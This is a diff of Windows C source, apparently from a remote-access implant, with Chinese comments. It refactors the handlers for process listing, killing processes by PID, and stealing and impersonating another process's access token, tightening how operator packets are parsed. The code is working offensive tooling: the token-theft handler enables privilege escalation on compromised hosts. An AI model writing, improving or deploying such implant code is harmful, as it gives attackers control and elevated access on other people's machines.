@@ -4,18 +4,6 @@
 
 #pragma comment(lib, "advapi32.lib")
 
-/* 将进程计数字段修补到输出缓冲区起始位置 */
-static VOID PsPatchCount(ByteBuf* out, UINT32 count)
-{
-    if (out->len < 4) {
-        return;
-    }
-    out->data[0] = (BYTE8)((count >> 24) & 0xffu);
-    out->data[1] = (BYTE8)((count >> 16) & 0xffu);
-    out->data[2] = (BYTE8)((count >> 8) & 0xffu);
-    out->data[3] = (BYTE8)(count & 0xffu);
-}
-
 /* 将字符串以长度前缀字节形式打包到输出缓冲区 */
 static VOID PsPackStringBytes(ByteBuf* out, const CHAR* value)
 {
@@ -185,21 +173,26 @@ ByteBuf CommandPs(VOID)
 
     /* 完成：将进程计数修补到起始位置 */
     CloseHandle(snap);
-    PsPatchCount(&out, count);
+    PacketPatchU32(&out, count);
     return out;
 }
 
-/* 通过 PID 终止进程 */
+/* 通过 PID 终止进程。
+ * wire：[count][pid]；count=0 与截断包在此显式区分，不再让 pid 静默落到 0。 */
 ByteBuf CommandKill(Parser* p)
 {
+    UINT32 count;
     DWORD pid;
     HANDLE proc;
 
     /* 验证参数 */
-    if (ParserU32(p) == 0) return BbFromText("kill requires 1 argument");
+    count = ParserU32(p);
+    if (p->error[0] || count == 0) return BbFromText("kill requires 1 argument");
+
+    pid = ParserU32(p);
+    if (p->error[0]) return BbFromText(p->error);
 
     /* 打开并终止进程 */
-    pid = ParserU32(p);
     proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
     if (!proc) return BbFromText("OpenProcess failed");
     TerminateProcess(proc, 0);
@@ -207,19 +200,23 @@ ByteBuf CommandKill(Parser* p)
     return BbFromText("Process terminated");
 }
 
-/* 窃取并模拟目标进程的令牌 */
+/* 窃取并模拟目标进程的令牌。wire 同 kill：[count][pid]，缺参/截断显式报错。 */
 ByteBuf CommandStealToken(Parser* p)
 {
+    UINT32 count;
     DWORD pid;
     HANDLE proc;
     HANDLE token = NULL;
     HANDLE dup = NULL;
 
     /* 验证参数 */
-    if (ParserU32(p) == 0) return BbFromText("stealtoken requires 1 argument");
+    count = ParserU32(p);
+    if (p->error[0] || count == 0) return BbFromText("stealtoken requires 1 argument");
+
+    pid = ParserU32(p);
+    if (p->error[0]) return BbFromText(p->error);
 
     /* 打开进程并复制其令牌 */
-    pid = ParserU32(p);
     proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (!proc) return BbFromText("OpenProcess failed");
 
